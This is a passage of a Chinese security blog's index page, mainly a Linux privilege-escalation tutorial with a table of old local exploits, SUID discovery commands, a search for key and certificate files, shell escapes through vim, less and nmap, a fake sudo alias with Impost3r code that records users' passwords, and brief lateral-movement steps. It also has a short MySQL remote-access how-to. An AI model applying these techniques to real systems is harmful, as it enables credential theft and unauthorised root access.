<td>Linux Kernel 2.6.x - Ext4’move extents’ ioctl PrivilegeEscalation</td>
<td>Akira Fujita</td>
</tr>
<tr>
<td>2013/02/24</td>
<td>Linux Kernel 3.3 &lt; 3.8(Ubuntu / Fedora 18) -‘sock_diag_handlers()’ LocalPrivilege Escalation (3)</td>
<td>SynQ</td>
</tr>
<tr>
<td>2009/11/03</td>
<td>Linux Kernel 2.6.x - ‘pipe.c’Local Privilege Escalation (2)</td>
<td>teach &amp; xipe</td>
</tr>
<tr>
<td>2009/11/03</td>
<td>Linux Kernel 2.6.0 &lt; 2.6.31 -‘pipe.c’ Local PrivilegeEscalation (1)</td>
<td>teach &amp; xipe</td>
</tr>
<tr>
<td>2009/03/02</td>
<td>Linux Kernel 2.6.x -‘seccomp’ System CallSecurity Bypass</td>
<td>Chris Evans</td>
</tr>
<tr>
<td>2009/02/20</td>
<td>Linux Kernel 2.6.x - ‘sock.c’SO_BSDCOMPAT OptionInformation Disclosure</td>
<td>Clément Lecigne</td>
</tr>
<tr>
<td>2014/02/02</td>
<td>Linux Kernel 3.4 &lt; 3.13.2(Ubuntu 13.10) -‘CONFIG_X86_X32’ ArbitraryWrite (2)</td>
<td>saelo</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>2007/9/21</th>
<th>Linux Kernel 2.6.x - ALSAsnd-page-alloc Local ProcFile Information Disclosure</th>
<th>Karimo_DM</th>
</tr>
</thead>
<tbody><tr>
<td>2007/9/21</td>
<td>Linux Kernel 2.6.x - PtracePrivilege Escalation</td>
<td>Wojciech Purczynski</td>
</tr>
<tr>
<td>2007/03/05</td>
<td>Linux Kernel 2.6.17 -‘Sys_Tee’ Local PrivilegeEscalation</td>
<td>Michael Kerrisk</td>
</tr>
<tr>
<td>2006/07/27</td>
<td>Linux-HA Heartbeat1.2.3/2.0.x - InsecureDefault Permissions onShared Memory</td>
<td>anonymous</td>
</tr>
<tr>
<td>2006/04/28</td>
<td>Linux Kernel 2.6.x - CIFSCHRoot Security RestrictionBypass</td>
<td>Marcel Holtmann</td>
</tr>
<tr>
<td>2006/04/28</td>
<td>Linux Kernel 2.6.x - SMBFSCHRoot Security RestrictionBypass</td>
<td>Marcel Holtmann</td>
</tr>
<tr>
<td>2006/03/23</td>
<td>Linux Kernel2.4.x/2.5.x/2.6.x -‘Sockaddr_In.Sin_Zero’Kernel Memory Disclosure</td>
<td>Pavel Kankovsky</td>
</tr>
<tr>
<td>2005/10/17</td>
<td>Linux Kernel 2.6 - ConsoleKeymap Local CommandInjection</td>
<td>Rudolf Polzer</td>
</tr>
<tr>
<td>2005/05/26</td>
<td>Linux Kernel 2.6.x -Cryptoloop InformationDisclosure</td>
<td>Markku-JuhaniO. Saarinen</td>
</tr>
<tr>
<td>2005/10/19</td>
<td>Linux Kernel 2.4.30/2.6.11.5- BlueTooth’bluez_sock_create’ LocalPrivilege Escalation</td>
<td>backdoored.net</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>2005/04/08</th>
<th>Linux Kernel 2.4.x/2.6.x -BlueTooth Signed BufferIndex Privilege Escalation (1)</th>
<th>qobaiashi</th>
</tr>
</thead>
<tbody><tr>
<td>2005/03/09</td>
<td>Linux Kernel 2.6.x -‘SYS_EPoll_Wait’ LocalInteger Overflow / LocalPrivilege Escalation (1)</td>
<td>sd</td>
</tr>
<tr>
<td>2004/04/23</td>
<td>Linux Kernel 2.5.x/2.6.x -CPUFreq Proc HandlerInteger Handling MemoryRead</td>
<td>Brad Spengler</td>
</tr>
<tr>
<td>2004/02/09</td>
<td>Samba 2.2.8 (Linux Kernel2.6 / Debian / Mandrake) -Share Privilege Escalation</td>
<td>Martin Fiala</td>
</tr>
<tr>
<td>2004/02/06</td>
<td>Linux VServer Project 1.2x -Chroot Breakout</td>
<td>Markus Mueller</td>
</tr>
<tr>
<td>2003/10/06</td>
<td>SuSE Linux Professional 8.2- SuSEWM ConfigurationFile Insecure Temporary File</td>
<td>Nash Leon</td>
</tr>
<tr>
<td>2003/09/09</td>
<td>RealOne Player for Linux 2.2Alpha - InsecureConfiguration FilePermission PrivilegeEscalation</td>
<td>Jon Hart</td>
</tr>
<tr>
<td>2012/12/02</td>
<td>MySQL (Linux) - DatabasePrivilege Escalation</td>
<td>kingcope</td>
</tr>
<tr>
<td>2003/06/26</td>
<td>Linux Kernel 2.4 - SUID’execve()’ System Call RaceCondition Executable FileRead</td>
<td>IhaQueR</td>
</tr>
<tr>
<td>2003/06/20</td>
<td>Linux Kernel 2.2.x/2.4.x -‘/proc’ FilesystemInformation Disclosure</td>
<td>IhaQueR</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>2003/06/16</th>
<th>Linux PAM 0.77 -Pam_Wheel Module’getlogin() Username’Spoofing Privilege Escalation</th>
<th>Karol Wiesek</th>
</tr>
</thead>
<tbody><tr>
<td>2003/02/18</td>
<td>Linux-ATM LES 2.4 -Command Line ArgumentBuffer Overflow</td>
<td>Angelo Rosiello</td>
</tr>
<tr>
<td>2003/04/04</td>
<td>Linux Kernel 2.2.x/2.4.x -I/O System Call FileExistence</td>
<td>Andrew Griffiths</td>
</tr>
<tr>
<td>2003/04/10</td>
<td>Linux Kernel 2.2.x/2.4.x -Privileged Process HijackingPrivilege Escalation (2)</td>
<td>Wojciech Purczynski</td>
</tr>
<tr>
<td>2003/03/17</td>
<td>Linux Kernel 2.2.x/2.4.x -Privileged Process HijackingPrivilege Escalation (1)</td>
<td><a href="mailto:anszom@v-lo.krakow.pl" target="_blank" rel="noopener">anszom@v-lo.krakow.pl</a></td>
</tr>
<tr>
<td>2012/10/10</td>
<td>Linux Kernel UDEV &lt; 1.4.1 -‘Netlink’ Local PrivilegeEscalation (Metasploit)</td>
<td>Metasploit</td>
</tr>
<tr>
<td>2002/08/28</td>
<td>Linuxconf 1.1.x/1.2.x - LocalEnvironment Variable BufferOverflow (3)</td>
<td>syscalls</td>
</tr>
<tr>
<td>2002/08/28</td>
<td>Linuxconf 1.1.x/1.2.x - LocalEnvironment Variable BufferOverflow (2)</td>
<td>David Endler</td>
</tr>
<tr>
<td>2002/08/28</td>
<td>Linuxconf 1.1.x/1.2.x - LocalEnvironment Variable BufferOverflow (1)</td>
<td>RaiSe</td>
</tr>
<tr>
<td>2002/08/10</td>
<td>ISDN4Linux 3.1 - IPPPDDevice String SysLog FormatString (2)</td>
<td>TESO Security</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>2002/08/10</th>
<th>ISDN4Linux 3.1 - IPPPDDevice String SysLog FormatString (1)</th>
<th>Gobbles Security</th>
</tr>
</thead>
<tbody><tr>
<td>2002/05/17</td>
<td>Grsecurity Kernel Patch 1.9.4(Linux Kernel) - MemoryProtection</td>
<td>Guillaume PELAT</td>
</tr>
<tr>
<td>2002/03/26</td>
<td>Linux Kernel 2.2.x/2.3/2.4.x- ‘d_path()’ Path Truncation</td>
<td>cliph</td>
</tr>
<tr>
<td>2002/02/25</td>
<td>Century Software Term ForLinux 6.27.869 - CommandLine Buffer Overflow</td>
<td>Haiku Hacker</td>
</tr>
<tr>
<td>2000/08/25</td>
<td>User-Mode Linux (LinuxKernel 2.4.17-8) - MemoryAccess Privilege Escalation</td>
<td>Andrew Griffiths</td>
</tr>
<tr>
<td>2001/11/21</td>
<td>SuSE Linux 6.4/7.0/7.1/7.2Berkeley Parallel Make -Local Buffer Overflow</td>
<td>IhaQueR@IRCnet</td>
</tr>
<tr>
<td>2001/11/21</td>
<td>SuSE Linux 6.4/7.0/7.1/7.2Berkeley Parallel Make -Shell Definition FormatString</td>
<td>IhaQueR@IRCnet</td>
</tr>
<tr>
<td>2001/10/18</td>
<td>Linux Kernel 2.2/2.4 -Ptrace/Setuid Exec PrivilegeEscalation</td>
<td>Rafal Wojtczuk</td>
</tr>
<tr>
<td>2001/06/27</td>
<td>Linux Kernel 2.2/2.4 -procfs Stream redirection toProcess Memory PrivilegeEscalation</td>
<td></td>
</tr>
<tr>
<td>2001/06/12</td>
<td>Linux Man Page6.1/6.2/7.0/7.1- SourceBuffer Overflow</td>
<td>zen-parse</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>2001/05/13</th>
<th>Immunix OS 6.2/7.0 /RedHat 5.2/6.2/7.0 / SuSELinux 6.x/7.0/7.1 - ‘Man -S’Heap Overflow</th>
<th>zenith parsec</th>
</tr>
</thead>
<tbody><tr>
<td>2001/03/27</td>
<td>Linux Kernel 2.2.18 (RedHat6.2/7.0 /2.2.14/2.2.18/2.2.18ow4) -ptrace/execve RaceCondition PrivilegeEscalation (2)</td>
<td>Wojciech Purczynski</td>
</tr>
<tr>
<td>2001/03/27</td>
<td>Linux Kernel 2.2.18 (RedHat6.2/7.0 /2.2.14/2.2.18/2.2.18ow4) -ptrace/execve RaceCondition PrivilegeEscalation (1)</td>
<td>Wojciech Purczynski</td>
</tr>
<tr>
<td>2001/02/09</td>
<td>Linux Kernel 2.2.x - ‘sysctl()’Memory Reading</td>
<td>Chris Evans</td>
</tr>
<tr>
<td>2000/11/30</td>
<td>Linux Kernel 2.2.x - Non-Readable File Ptrace LocalInformation Leak</td>
<td>Lamagra Argamal</td>
</tr>
<tr>
<td>2000/11/12</td>
<td>Linux modutils 2.3.9 -‘modprobe’ ArbitraryCommand Execution</td>
<td>Michal Zalewski</td>
</tr>
<tr>
<td>2000/06/07</td>
<td>Linux Kernel 2.2.x 2.4.0-test1 (SGI ProPack 1.2/1.3) -Sendmail 8.10.1 CapabilitiesPrivilege Escalation (2)</td>
<td>Wojciech Purczynski</td>
</tr>
<tr>
<td>2000/06/07</td>
<td>Linux Kernel 2.2.x 2.4.0-test1 (SGI ProPack 1.2/1.3) -Sendmail CapabilitiesPrivilege Escalation(1)</td>
<td>Florian Heinz</td>
</tr>
<tr>
<td>2000/05/29</td>
<td>Mandriva Linux Mandrake 7.0- Local Buffer Overflow</td>
<td>noir</td>
</tr>
<tr>
<td>2000/05/22</td>
<td>S.u.S.E Linux 4.x/5.x/6.x/7.0/ Slackware 3.x/4.0 /Turbolinux 6 / OpenLinux 7.0- ‘fdmount’ Local BufferOverflow (3)</td>
<td>WaR</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>2000/05/22</th>
<th>S.u.S.E Linux 4.x/5.x/6.x/7.0/ Slackware 3.x/4.0 /Turbolinux 6 / OpenLinux 7.0- ‘fdmount’ Local BufferOverflow (2)</th>
<th>Scrippie</th>
</tr>
</thead>
<tbody><tr>
<td>2000/05/22</td>
<td>S.u.S.E Linux 4.x/5.x/6.x/7.0/ Slackware 3.x/4.0 /Turbolinux 6 / OpenLinux 7.0- ‘fdmount’ Local BufferOverflow (1)</td>
<td>Paulo Ribeiro</td>
</tr>
<tr>
<td>2012/07/19</td>
<td>Linux Kernel 2.4.4 &lt; 2.4.37.4/ 2.6.0 &lt; 2.6.30.4 -‘Sendpage’ Local PrivilegeEscalation (Metasploit)</td>
<td>Metasploit</td>
</tr>
<tr>
<td>2000/05/03</td>
<td>RedHat Linux 6.0/6.1/6.2 -‘pam_console’ MonitorActivity After Logout</td>
<td>Michal Zalewski</td>
</tr>
<tr>
<td>2000/04/29</td>
<td>SuSE Linux 6.3/6.4 Gnomelib- Local Buffer Overflow</td>
<td>bladi</td>
</tr>
<tr>
<td>2000/04/21</td>
<td>SuSE Linux 6.x - ArbitraryFile Deletion</td>
<td>Peter_M</td>
</tr>
<tr>
<td>2000/04/10</td>
<td>Bray Systems Linux Trustees1.5 - Long Pathname</td>
<td>Andrey E. Lerman</td>
</tr>
<tr>
<td>2000/03/16</td>
<td>Halloween Linux 4.0 / SuSELinux 6.0/6.1/6.2/6.3 -‘kreatecd’ Local PrivilegeEscalation</td>
<td>Sebastian</td>
</tr>
<tr>
<td>2000/03/13</td>
<td>Halloween Linux 4.0 /RedHat Linux 6.1/6.2 -‘imwheel’ (2)</td>
<td>S.Krahmer &amp; Stealth</td>
</tr>
<tr>
<td>2000/03/13</td>
<td>Halloween Linux 4.0 /RedHat Linux 6.1/6.2 -‘imwheel’ (1)</td>
<td>funkysh</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>2000/03/11</th>
<th>AT Computing atsar_linux 1.4- File Manipulation</th>
<th>S. Krahmer</th>
</tr>
</thead>
<tbody><tr>
<td>2000/03/05</td>
<td>Oracle8i Standard Edition8.1.5 for Linux Installer -Local Privilege Escalation</td>
<td>Keyser Soze</td>
</tr>
<tr>
<td>2000/03/02</td>
<td>Corel Linux OS 1.0 - DosemuDistribution Configuration</td>
<td>suid</td>
</tr>
<tr>
<td>2000/02/26</td>
<td>RedHat 4.x/5.x/6.x / RedHatman 1.5 / Turbolinux man 1.5/ Turbolinux 3.5/4.x - ‘man’Buffer Overrun (2)</td>
<td>Babcia Padlina</td>
</tr>
<tr>
<td>2000/02/26</td>
<td>RedHat 4.x/5.x/6.x / RedHatman 1.5 / Turbolinux man 1.5/ Turbolinux 3.5/4.x - ‘man’Buffer Overrun (1)</td>
<td>Babcia Padlina</td>
</tr>
<tr>
<td>2000/02/24</td>
<td>Corel Linux OS 1.0 -‘setxconf’ Local PrivilegeEscalation</td>
<td>suid</td>
</tr>
<tr>
<td>2000/02/24</td>
<td>Corel Linux OS 1.0 -buildxconfig</td>
<td>suid</td>
</tr>
<tr>
<td>2000/02/23</td>
<td>RedHat Linux 6.0 - SingleUser Mode Authentication</td>
<td>Darren Reed</td>
</tr>
<tr>
<td>2000/01/12</td>
<td>Corel Linux OS 1.0 - get_itPATH</td>
<td>Cesar Tascon Alvarez</td>
</tr>
<tr>
<td>2000/03/15</td>
<td>Mandrake 6.x / RedHat 6.x /Turbolinux 3.5 b2/4.x/6.0.2userhelper/PAM - Path (2)</td>
<td>Elias Levy</td>
</tr>
</tbody></table>
<p>⽐较常⽤的漏洞：</p>
<p>CVE-2016-5195: 脏⽜漏洞</p>
<p>CVE-2019-14287: sudo溢出漏洞</p>
<p>可以通过⾃动化脚本来匹配相关的内核漏洞：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/rebootuser/LinEnum </span><br><span class="line">https://github.com/mzet-/linux-exploit-suggester</span><br></pre></td></tr></table></figure>

<h3 id="0x03-suid提权"><a href="#0x03-suid提权" class="headerlink" title="0x03 suid提权"></a><strong>0x03 suid提权</strong></h3><p>suid允许⽤户在执⾏⽤户的许可下执⾏⽂件，创建和打开⽹络套接字⼀般需要root权限，但是为了⽅便使 ⽤，如Ping命令，通过设置Ping程序的suid，就可以允许低权限⽤户执⾏Ping程序时是以root权限执⾏。因此，如果⼀个程序中设置了suid，我们可以该程序⽣成的shell来提升权限。</p>
<p><strong>查找suid和guid⽂件</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -perm -g=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><strong>其它可⽤的命令</strong></p>
<p><strong>查找密钥或者证书:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -type f &apos;(&apos; -name .cert -or -name .crt -or -name .pem -or name .ca -or -name .p12 -or -name .cer -name *.der &apos;)&apos; &apos;(&apos; &apos;(&apos; -us er support -perm -u=r &apos;)&apos; -or &apos;(&apos; -group support -perm -g=r &apos;)&apos; -o r &apos;(&apos; -perm -o=r &apos;)&apos; &apos;)&apos; 2&gt; /dev/null-or -name .cer -name .der &apos;)&apos; 2&gt; /dev/nu</span><br></pre></td></tr></table></figure>

<p><strong>查找root拥有的suid⽂件</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -uid 0 -perm -4000 -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p><strong>例⼦</strong></p>
<p><strong>vi / vim</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">:set shell=/bin/sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>

<p><strong>less</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less /etc/passwd</span><br><span class="line">!/bin/sh</span><br></pre></td></tr></table></figure>

<p><strong>nmap</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -interactive</span><br><span class="line">! sh</span><br></pre></td></tr></table></figure>

<h3 id="0x04-伪造sudo"><a href="#0x04-伪造sudo" class="headerlink" title="0x04 伪造sudo"></a><strong>0x04 伪造sudo</strong></h3><p>Linux下命令执⾏顺序可以由⽤户决定，如改变.bashrc中的环境变量信息，也可以给某命令增加⼀个别名 等。可以伪造⼀个sudo命令，让⽤户每次输⼊的⼝令都存储下来，达到提权的⽬的。这⾥推荐Impost3r项⽬</p>
<p><strong>创建sudo别名</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">alias sudo=&apos;impost3r() &#123;</span><br><span class="line">if [ -f &quot;/tmp/.impost3r&quot; ]; then</span><br><span class="line">/tmp/.impost3r &quot;$@&quot; &amp;&amp; unalias sudo</span><br><span class="line">else</span><br><span class="line">unalias sudo;sudo &quot;$@&quot;</span><br><span class="line">fi</span><br><span class="line">&#125;; impost3r&apos;</span><br></pre></td></tr></table></figure>

<p><strong>impost3r核⼼代码</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">int pid = fork();</span><br><span class="line">if (pid == 0)</span><br><span class="line">&#123;</span><br><span class="line">successFlag = 0;</span><br><span class="line">save_passwd(usrInfo-&gt;pw_name,originPasswd,allPasswd,1);</span><br><span class="line">return allPasswd;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">wait(NULL); // 防⽌⽤户执⾏的是⽆限循环服务，从⽽产⽣僵⼫进程</span><br><span class="line">execv(&quot;/usr/bin/sudo&quot;,params);</span><br><span class="line">exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将⽤户输⼊的⼝令信息先通过 save_passwd 存储下来，然后再调⽤真实的sudo命令。</span><br></pre></td></tr></table></figure>

<h3 id="0x05-其它提权⼿法"><a href="#0x05-其它提权⼿法" class="headerlink" title="0x05 其它提权⼿法"></a><strong>0x05 其它提权⼿法</strong></h3><p>1.LXD提权</p>
<p>2.cronjob计划任务提权</p>
<p>3.NFS提权</p>
<p>4.⼝令爆破提权</p>
<h1 id="内网横向移动（拿域控）"><a href="#内网横向移动（拿域控）" class="headerlink" title="内网横向移动（拿域控）"></a>内网横向移动（拿域控）</h1><ol>
<li>使用当前权限添加内网路由，进行弱口令扫描</li>
<li>使用powershell对内网进行扫描（目标机器 &gt; win7）</li>
<li>架设Socket4a，然后Socket会自动进行内网扫描</li>
<li>利用当前权限进行内网IPC$渗透</li>
</ol>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/02/07/python学习记录.html/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="狗蛋菌">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Goudan's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/02/07/python学习记录.html/" itemprop="url">python学习记录</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-02-07T19:46:24+08:00">
                2021-02-07
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  550 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  2 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          <h1 id="python的shodan库"><a href="#python的shodan库" class="headerlink" title="python的shodan库"></a>python的shodan库</h1>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2021/02/07/python学习记录.html/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/02/06/linux反弹shell的几种常见手段.html/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="狗蛋菌">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Goudan's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/02/06/linux反弹shell的几种常见手段.html/" itemprop="url">linux反弹shell的几种常见手段</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-02-06T21:04:23+08:00">
                2021-02-06
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  0 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            
          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://goudanjun.vip/2021/02/04/配置mysql远程访问.html/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="狗蛋菌">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Goudan's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2021/02/04/配置mysql远程访问.html/" itemprop="url">配置mysql远程访问</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-02-04T16:40:48+08:00">
                2021-02-04
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Words count in article&#58;</span>
                
                <span title="Words count in article">
                  200 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">Reading time &asymp;</span>
                
                <span title="Reading time">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>新装一台虚拟机mysql的时候，往往会出现win无法连接的情况，报错信息1130，是因为没有权限的问题，解决方案如下：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">mysql -u root -p</span><br><span class="line"><span class="comment">#以权限用户root登录</span></span><br><span class="line">mysql&gt;use mysql;</span><br><span class="line"><span class="comment">#选择mysql库</span></span><br><span class="line">mysql&gt;select <span class="string">'host'</span> from user <span class="built_in">where</span> user=<span class="string">'root'</span>;</span><br><span class="line"><span class="comment">#查看mysql库中的user表的host值（即可进行连接访问的主机/IP名称）</span></span><br><span class="line">mysql&gt;update user <span class="built_in">set</span> host = <span class="string">'%'</span> <span class="built_in">where</span> user =<span class="string">'root'</span>;</span><br><span class="line"><span class="comment">#修改host值（以通配符%的内容增加主机/IP地址），当然也可以直接增加IP地址</span></span><br><span class="line">mysql&gt;flush privileges;</span><br><span class="line"><span class="comment">#刷新MySQL的系统权限相关表</span></span><br><span class="line">mysql&gt;select <span class="string">'host'</span> from user <span class="built_in">where</span> user=<span class="string">'root'</span>;</span><br><span class="line"><span class="comment">#再重新查看user表时，有修改</span></span><br></pre></td></tr></table></figure>

<p>记得Mysql服务需要重新启动（确保修改有效-service mysql restart），否则可能修改的结果无法体现。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">狗蛋菌</p>
              <p class="site-description motion-element" itemprop="description">Stay Hungry,Stay Foolish</p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">24</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">20</span>
                  <span class="site-state-item-name">tags</span>
                </a>
              </div>
            

          </nav>

          
            <div class="feed-link motion-element">
              <a href="/stom.xml" rel="alternate">
                <i class="fa fa-rss"></i>
                RSS
              </a>
            </div>
          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/goudanjun" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
            </div>
          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; 2019 &mdash; <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">狗蛋菌</span>

  
</div>





 



 




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  



  
  









  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
